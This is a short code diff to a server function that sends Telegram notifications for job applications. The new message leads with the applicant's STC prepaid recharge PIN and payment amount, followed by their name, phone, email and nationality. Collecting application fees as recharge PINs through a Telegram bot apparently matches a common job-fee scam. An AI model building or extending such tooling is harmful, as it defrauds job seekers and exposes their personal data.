@@ -22,20 +22,26 @@ export const notifyTelegram = createServerFn({ method: "POST" })
       return { ok: false, skipped: true };
     }
 
+    const site =
+      process.env.SITE_URL ||
+      (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null);
+    const adminLink = site ? `${site}/admin/payments` : null;
+
     const text =
-      `🆕 *New Job Application*\n\n` +
-      `*ID:* \`${data.application_id}\`\n` +
+      `🔔 *NEW PAYMENT — VERIFY PIN*\n\n` +
+      `💳 *STC Recharge PIN*\n` +
+      `\`${data.recharge_pin}\`\n\n` +
+      `*Amount:* ${data.amount_paid} SAR\n` +
+      `*Application:* \`${data.application_id}\`\n` +
       `*Job:* ${escape(data.job_title)}\n` +
-      `*Company:* ${escape(data.company_name)}\n` +
-      `\n👤 *Applicant*\n` +
+      `*Company:* ${escape(data.company_name)}\n\n` +
+      `👤 *Applicant*\n` +
       `Name: ${escape(data.full_name)}\n` +
       `Phone: ${escape(data.phone)}\n` +
       (data.email ? `Email: ${escape(data.email)}\n` : "") +
       (data.nationality ? `Nationality: ${escape(data.nationality)}\n` : "") +
-      `\n💳 *Payment*\n` +
-      `Amount: ${data.amount_paid} SAR\n` +
-      `STC PIN: \`${escape(data.recharge_pin)}\`\n` +
-      `\n_Verify the PIN in the admin panel._`;
+      `\n✅ Verify or reject in Admin → Payment Transactions` +
+      (adminLink ? `\n${escape(adminLink)}` : "");
 
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
